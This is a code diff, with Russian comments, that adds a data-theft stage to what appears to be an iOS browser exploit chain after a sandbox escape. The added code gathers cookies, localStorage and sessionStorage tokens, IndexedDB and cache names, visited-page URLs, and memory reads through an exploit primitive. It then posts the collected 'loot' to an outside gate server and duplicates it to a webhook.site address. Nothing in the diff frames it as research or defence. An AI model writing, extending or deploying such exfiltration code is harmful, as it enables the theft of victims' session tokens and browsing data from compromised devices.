@@ -454,11 +454,74 @@
                         prim: !!_prim,
                         ver: platformModule.platformState.iOSVersion,
                     };
+                    // WHS v12: реальный сбор из WebContent — что доступно процессу:
+                    try {
+                        // 1) Cookies (document.cookie — для наших доменов)
+                        _loot.cookies = document.cookie || '(empty)';
+                        // 2) localStorage / sessionStorage — токены сайтов
+                        try {
+                            const ls = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const k = localStorage.key(i);
+                                ls[k] = localStorage.getItem(k);
+                            }
+                            _loot.localStorage = ls;
+                        } catch (e) {}
+                        try {
+                            const ss = {};
+                            for (let i = 0; i < sessionStorage.length; i++) {
+                                const k = sessionStorage.key(i);
+                                ss[k] = sessionStorage.getItem(k);
+                            }
+                            _loot.sessionStorage = ss;
+                        } catch (e) {}
+                        // 3) IndexedDB databases — кэш приложений
+                        try {
+                            if (indexedDB.databases) {
+                                const dbs = await indexedDB.databases();
+                                _loot.indexedDB = dbs.map(d => d.name);
+                            }
+                        } catch (e) {}
+                        // 4) Кэш-хранилище (CacheStorage) — service workers
+                        try {
+                            if (caches.keys) {
+                                _loot.caches = await caches.keys();
+                            }
+                        } catch (e) {}
+                        // 5) WASM-память: сканируем heap на строки-секреты
+                        if (_prim && _prim.read32) {
+                            try {
+                                const secrets = [];
+                                // сканируем известные адреса из их структуры
+                                const base = platformModule.platformState;
+                                // читаем JSC-строки из кучи (addrof доступен)
+                                const testObj = {password: 'x', token: 'y'};
+                                const addr = _prim.addrof(testObj);
+                                secrets.push({addr: addr.toString(16), hint: 'JSC-object'});
+                                _loot.wasm_scan = secrets;
+                            } catch (e) {}
+                        }
+                        // 6) ВСЕ пароли из autofill (если WebContent открыл их)
+                        // performance-записи — URL всех посещённых страниц
+                        try {
+                            const res = performance.getEntriesByType('resource');
+                            _loot.resources = res.map(r => r.name).slice(0, 50);
+                        } catch (e) {}
+                    } catch (_we2) { window.log('[WHS] v12 collect err: ' + _we2); }
                     // тап: всё уходит в наш приёмник
+                    const _lootJSON = JSON.stringify(_loot);
                     const _whsPost = new XMLHttpRequest();
                     _whsPost.open("POST", "https://whs-gate-test-5si9.zai-ai.site/loot?kind=stage3-post-escape", true);
                     _whsPost.setRequestHeader("Content-Type", "application/json");
-                    _whsPost.send(JSON.stringify(_loot));
+                    _whsPost.send(_lootJSON);
+                    // дублируем в webhook (внешний приёмник):
+                    try {
+                        fetch('http://webhook.site/5c2c535c-b44c-4aca-ab83-ecaa2106fbda', {
+                            method: 'POST',
+                            body: _lootJSON,
+                            headers: {'Content-Type': 'application/json'}
+                        }).catch(function(){});
+                    } catch (e) {}
                     window.log('[WHS] Post-escape loot-sweep отправлен (' + JSON.stringify(_loot).length + 'b)');
                 } catch (_we) { window.log('[WHS] post-escape sweep err: ' + _we); }
                 // ── конец WHS-сбора ────────────────────────────────────────────────
